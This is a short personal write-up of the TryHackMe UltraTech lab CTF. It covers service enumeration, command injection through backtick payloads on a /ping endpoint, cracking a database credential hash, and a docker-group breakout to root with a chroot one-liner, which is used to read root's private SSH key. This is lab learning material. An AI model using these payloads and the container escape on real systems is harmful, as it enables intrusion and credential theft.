# HackLog 1 – TryHackMe UltraTech

🗓️ **Date:** 2025-05-21  
🔍 **Objective:** Read the root user's private SSH key  
🧪 **Target:** TryHackMe UltraTech (Lab CTF)  

---

## 🛠️ Actions Taken

- **Port & Service Enumeration**
  ```
  nmap -sV <IP>
  ```
  → Found services on higher ports.

- **Directory & Endpoint Discovery**
  ```
  gobuster dir -u http://<IP>:<PORT> -w <wordlist>
  ```

- **Command Injection Testing on `/ping?ip=`**
  - Successful:
    ```
    /ping?ip=`ls`
    ```
  - Unsuccessful (filtered):
    ```
    /ping?ip=10.10.10.10;whoami
    /ping?ip='ls'
    ```

- **Post-Exploitation**
  - Found `config` file with database credentials.
  - Cracked password hash via [crackstation.net](https://crackstation.net/).
  - Logged in via SSH using recovered creds.

- **Privilege Escalation**
  - `sudo -l` → No root permissions.
  - `id` → User is in `docker` group.
  - Searched [GTFOBins – Docker](https://gtfobins.github.io/gtfobins/docker/)

- **Docker-to-Root Shell**
  ```
  docker run -v /:/mnt --rm -it bash chroot /mnt sh
  ```

- **Loot**
  - Read `/root/.ssh/id_rsa` and saved the private key.

---

## 🔍 Key Findings

- Open services on unusual ports.
- Vulnerable `/ping` endpoint allowing command injection via backticks (\`\`).
- Exposed config file with hashed creds.
- Docker group membership → Full root access via container breakout.
- Root user's private SSH key extracted.

---

## 📚 What I Learned

- Backtick-wrapping can bypass common input filters in command injection.
- User group memberships (`id`) can lead to privilege escalation.
- Docker escape via volume mounts and `chroot` is a powerful root vector.
- If `docker run` fails due to missing images, check local containers with:
  ```
  docker ps -a
  ```

---

## 📝 Will Write About

**Title (tentative):** _"TryHackMe UltraTech: From Ping Injection to Root via Docker"_  
**Platform:** [Medium](https://medium.com/@yourusername)
